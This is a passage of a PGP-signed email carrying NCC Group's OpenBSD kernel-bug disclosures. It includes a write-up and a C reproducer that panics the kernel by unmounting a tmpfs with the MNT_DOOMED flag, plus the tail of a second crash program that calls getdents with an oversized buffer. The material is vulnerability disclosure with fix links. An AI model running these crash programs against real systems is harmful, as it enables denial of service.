#endif // BUG_WRITEUP ---------------------------------------------------

#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <dirent.h>

void xperror(int cond, char *msg)
{
    if(cond) {
        perror(msg);
        exit(1);
    }
}

int main(int argc, char **argv)
{
    int fd, x;

    fd = open("/", O_RDONLY);
    xperror(fd == -1, "/");

    x = getdents(fd, 0, 0x70000000);
    xperror(x == -1, "getdents");

    printf("no crash!\n");
    return 0;
}


--Apple-Mail=_9550C59C-1C29-4580-9242-141956FE37EE
Content-Transfer-Encoding: 7bit
Content-Type: text/html;
	charset=us-ascii

<html><body style="word-wrap: break-word; -webkit-nbsp-mode: space; -webkit-line-break: after-white-space;"><head><meta http-equiv="Content-Type" content="text/html charset=us-ascii"></head><div></div></body></html>
--Apple-Mail=_9550C59C-1C29-4580-9242-141956FE37EE
Content-Disposition: attachment;
	filename=unmount_panic.c
Content-Type: application/octet-stream;
	name="unmount_panic.c"
Content-Transfer-Encoding: 7bit

/*
 * unmount_panic.c
 *    Demonstrate a panic through the unmount system call.
 *
 * gcc -g unmount_panic.c -o unmount_panic
 */

#ifdef BUG_WRITEUP //---------------------------------------------------
Unmounting with MNT_DOOMED flag can lead to a kernel panic

Impact:
Root users or users on systems with kern.usermount set to true can
trigger a kernel panic when unmounting a filesystem.

Description:
When the unmount system call is called with the MNT_DOOMED flag
set, it does not sync vnodes. This can lead to a condition where
there is still a vnode on the mnt_vnodelist, which triggers a
panic in dounmount().

    if (!LIST_EMPTY(&mp->mnt_vnodelist))
        panic("unmount: dangling vnode");

This condition can only be triggered by users who are allowed
to unmount a filesystem. Normally this is the root user, but
if the kern.usernmount sysctl variable has been set to true,
any user could trigger this panic.

Reproduction:
Run the attached unmount_panic.c program.  It will mount a new
tmpfs on /mnt, open a file on it, and then unmount /mnt with
the MNT_DOOMED flag. This will lead to a panic of "unmount: dangling vnode".
NCC Group was able to reproduce this issue on OpenBSD 5.9 release 
running amd64.

Recommendation:
TBD
[OpenBSD developers decided to reject all flags other than MNT_FORCE].

Reported: 2016-07-12
Fixed:   http://cvsweb.openbsd.org/cgi-bin/cvsweb/src/sys/kern/vfs_syscalls.c.diff?r1=1.261&r2=1.262

#endif // BUG_WRITEUP ---------------------------------------------------


#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/param.h>
#include <sys/mount.h>

void xperror(int cond, char *msg)
{
    if(cond) {
        perror(msg);
        exit(1);
    }
}

int main(int argc, char **argv)
{
    struct tmpfs_args args = { TMPFS_ARGS_VERSION, 0, 0, 0, 0, 0 };
    int x, fd;

    x = mount("tmpfs", "/mnt", 0, &args);
    xperror(x == -1, "mount");

    fd = open("/mnt/somefile", O_RDWR | O_CREAT, 0666);
    xperror(fd == -1, "/mnt/somefile");

    x = unmount("/mnt", MNT_DOOMED);
    xperror(fd == -1, "unmount");

    printf("no crash!\n");
    return 0;
}


--Apple-Mail=_9550C59C-1C29-4580-9242-141956FE37EE
Content-Transfer-Encoding: 7bit
Content-Type: text/html;
	charset=us-ascii

<html><head><meta http-equiv="Content-Type" content="text/html charset=us-ascii"></head><body style="word-wrap: break-word; -webkit-nbsp-mode: space; -webkit-line-break: after-white-space;" class=""><div class=""></div><div class=""><br class=""></div></body></html>
--Apple-Mail=_9550C59C-1C29-4580-9242-141956FE37EE--

--Apple-Mail=_6CCE7EE4-D7D5-46E3-88CA-E6F041B6B171--

--Apple-Mail=_687C18D9-DCED-4674-94AF-2C504B829F41
Content-Transfer-Encoding: 7bit
Content-Disposition: attachment; filename="signature.asc"
Content-Type: application/pgp-signature; name="signature.asc"
Content-Description: Message signed with OpenPGP using GPGMail

-----BEGIN PGP SIGNATURE-----
Comment: GPGTools - https://gpgtools.org

iQEcBAEBCgAGBQJXh/+OAAoJEPhkPVYKhDWbZ7EH/0kFkn8pUwBk5h85V0vNOcEe
1nVrVHYmWqu94qbwa/gz1ddsd9/ckYmjcIuhl8NgmfEEHZp+bpoEvU+G8+PSRLxh
gndEkPHYoNe4TBky8KalpEF+dovwnqmW89A+cHXhMVcJR1IQiOrB6aVZGLY91Dij
i1aorkTS+YWx/S8IrJkGzJV4+31nWSU30I7V5Hxuzjv/b+UH6Zq6VA4ztpw+w3Xm
LbMcMN3Noq9hQCIPKO5hhvIKUSR7EqEuwiWNd0GWDlxZSW75XlfgLPjcok2kF3V6
aeA+0C6SKxIB7Tjlts1IHF00hbjHhDKWlhEMHfcDEVkWwdjw5F7MnDLGNOgb1vI=
=COjk
-----END PGP SIGNATURE-----

--Apple-Mail=_687C18D9-DCED-4674-94AF-2C504B829F41--

